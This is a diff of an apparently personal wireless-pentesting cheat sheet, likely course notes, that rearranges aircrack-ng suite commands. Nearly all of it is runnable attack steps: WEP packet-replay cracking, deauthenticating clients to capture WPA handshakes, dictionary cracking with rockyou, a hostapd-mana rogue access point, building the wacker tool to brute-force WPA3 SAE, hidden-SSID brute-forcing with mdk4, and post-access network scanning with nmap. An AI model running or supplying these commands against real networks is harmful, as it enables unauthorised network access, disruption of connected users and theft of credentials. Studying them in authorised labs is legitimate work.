@@ -3,13 +3,48 @@ airmon-ng start wlan0
 
 === SCANNING ===
 airodump-ng wlan0mon --manufacturer --wps --band abg
-airodump-ng wlan0mon -w ./airodump/scan --manufacturer --wps --band abg
 airodump-ng wlan0mon -w ./airodump/scan --manufacturer --wps -c $CHANNEL --bssid $BSSID --essid $ESSID
 
-=== BRUTEFORCE ESSID (HIDDEN AP) ===
+=== WEP ===
+airodump-ng -c $CHANNEL --bssid $BSSID -w ./airodump/$ESSID wlan0mon
+aireplay-ng -1 3600 -q 10 -a $BSSID wlan0mon
+aireplay-ng -3 -b $BSSID -h BA:49:A9:53:A1:8C wlan0mon
+aircrack-ng ~/airodump/$ESSID-01.cap
+
+=== PSK ===
+airodump-ng wlan0mon -w ./airodump/$ESSID --wps -c $CHANNEL --bssid $BSSID --essid $ESSID
+aireplay-ng -0 10 -a $BSSID -c $CLIENT wlan0mon 
+aircrack-ng ./airodump/$ESSID-01.cap -w ./rockyou.txt
+
+=== WPA2+PSK ===
+airodump-ng wlan0mon -w ./airodump/$ESSID --wps -c $CHANNEL --bssid $BSSID --essid $ESSID
+hostapd-mana conf/$CONF.conf
+aireplay-ng -0 10 -a $BSSID -c $CLIENT wlan0mon 
+aircrack-ng $HCCPAX -e $ESSID -w $PASSWORD_LIST
+
+=== WPA3+SAE ===
+# wacker
+mkdir tools 
+cd tools
+git clone https://github.com/blunderbuss-wctf/wacker.git
+cd wacker
+apt-get install -y pkg-config libnl-3-dev gcc libssl-dev libnl-genl-3-dev
+cp defconfig wpa_supplicant-2.10/wpa_supplicant/.config
+git apply wpa_supplicant.patch
+cd wpa_supplicant-2.10/wpa_supplicant
+make -j4
+ls -al wpa_supplicant
+
+./wacker.py --wordlist ~/wifu/rockyou.txt --ssid wifi-management --bssid $BSSID --interface wlan0 --freq 2462
+
+=== ROCKYOU ===
 tar -xvf /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz -C .
 cat rockyou.txt | awk '{print "wifi-" $1}' > wifi-rockyou.txt
+
+=== CHANGE CHANNEL ====
 iwconfig wlan0mon channel $CHANNEL
+
+=== BRUTEFORCE ESSID (HIDDEN AP) ===
 mdk4 wlan0mon p -t $ESSID -f wifi-rockyou.txt
 
 === CHANGE MAC ===
@@ -22,26 +57,9 @@ ip link set wlan2 up
 wpa_supplicant -Dnl80211 -iwlan2 -c $CONFIGURATION_FILE
 dhclient wlan2 -v
 
-=== CRACKING WEP ===
-aireplay-ng -1 3600 -q 10 -a $BSSID wlan0mon
-aireplay-ng -3 -b $BSSID -h BA:49:A9:53:A1:8C wlan0mon
-aircrack-ng ~/airodump/wifi-old-01.cap
-
-besside-ng -c 1 -b F0:9F:C2:AA:19:29 wlan2 -v
-
-=== CRACKING WPA ===
-aireplay-ng -0 10 -a $AP_MAC -c $CLIENT_MAC wlan0mon
-aircrack-ng $CAPTURE -w ~/rockyou.txt
-
 === FILTERING CAP ===
 airdecap-ng -e $ESSID -p $PASSWORD $CAPTURE
 
 === SCANNING NETWORKS ===
 arp-scan -I $WLAN -l
 nmap -p- -sV -sT -A $IP --open -v
-
-=== ROGUE AP ===
-cp ~/pen-210/conf/hostapd.conf .
-hostapd-mana hostapd.conf
-aircrack-ng $HCCPAX -e $ESSID -w $PASSWORD_LIST
-
